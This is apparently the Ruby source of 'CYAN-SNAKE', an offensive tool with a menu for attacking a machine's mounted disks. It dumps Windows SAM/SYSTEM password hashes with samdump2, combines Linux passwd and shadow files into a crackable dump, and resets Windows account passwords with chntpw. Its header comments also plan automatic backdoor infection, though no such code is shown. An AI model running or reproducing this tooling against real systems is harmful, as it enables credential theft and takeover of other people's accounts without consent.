
###
#
# Default Action
# - Get System Information
#  + Computer name
#  + Network config

# 1 > ON UI MODE
# 1-1 > Dump Hash(Win: SAM+SYSTEM / Linux: passwd+shadow)
# 1-2 > Change password(only windows)
# 1-3 > 

# 2 > OFF UI MODE(Auto mode)
# 2-1 > Auto Gathering System Information
# 2-2 > Auto Infection(remote backdoor)
# 2-3 > Auto Infection(bind backdoor)

@devices = Array.new()
@message = ""

def getcmd()
  system("clear")
puts "                      __    __    __    __  "
puts "                     /  \\  /  \\  /  \\  /  \\  "
puts "____________________/  __\\/  __\\/  __\\/  __\\_____________________________  "
puts "____CYAN-SNAKE_____/  /__/  /__/  /__/  /_________CODE BY HAHWUL_________  "
puts "                   | / \\   / \\   / \\   / \\  \\____  "
puts "                   |/   \\_/   \\_/   \\_/   \\    @ \\ "
puts "                                           \\_____/--<  "
  puts @message
  puts " ____________"
  print "[cyan-snake] #> "
  cmd = gets.chomp 
  return cmd
end

def sinit()
  IO.popen("fdisk -l -o Device", 'r') do |pipe|
   pipe.each_line do |line|
    if line[0..4] == "/dev/"
      @devices.push(line)
      puts "mount "+line.strip+" /mnt/"+line[5,8]
      #system("mount "+line.strip+" /mnt/"+line[5,8])
    end
   end
  end
end

def f1()
 @message = "(/1)\nPlease choice\n [1] > Dump Hash(Win: SAM+SYSTEM / Linux: passwd+shadow)\n [2] > Change password(only windows)\n"
 cmd = getcmd().downcase
 if cmd == '1'
   f11()
 end
 if cmd == '2'
   f12()
 end 
end

def f11()
 @message = "(/1/1)\nPlease choice\n [1] > Dump Hash(Win: SAM+SYSTEM / Linux: passwd+shadow)\n [2] > Change password(only windows)\n"
 @devices.each do |mnt|
  mnt = mnt.strip
  puts mnt+"/Windows/System32/config/"
  if(File.exist? File.expand_path(mnt+"/Windows/System32/config/"))
   Dir.chdir(mnt+"/Windows/System32/config/")
   system("samdump2 -o /data/dump.txt SYSTEM SAM")
   gets.chomp
  end
  
  if(File.exist? File.expand_path(mnt+"/usr/share/"))
   Dir.chdir(mnt+"/etc/")
   system("unshadow passwd shadow > /data/dump.txt")
   gets.chomp
  end

end
end

def f12()
 @message = "(/1/2)\nChange password(windows)\n"
 
 @devices.each do |mnt|
  mnt = mnt.strip
  puts mnt+"/Windows/System32/config/"
  if(File.exist? File.expand_path(mnt+"/Windows/System32/config/"))
   Dir.chdir(mnt+"/Windows/System32/config/")
   system("chntpw -l SAM")
   puts "Please input user name"
   print "[cyan-snake] #> "
   cmd = gets.chomp
   system("chntpw -u "+cmd+" SAM")
  end
 end

 gets.chomp
end

sinit()
while 1
  @message = "(/)\nPlease choice\n [1] > UI MODE\n [2] > auto"
  cmd = getcmd().downcase
  if cmd == 'exit' or cmd == 'quit'
    exit()
  end
  if cmd == 'shutdown'
    system("shutdown -h 0")
  end
  if cmd == '1'
    f1()
  end
end 

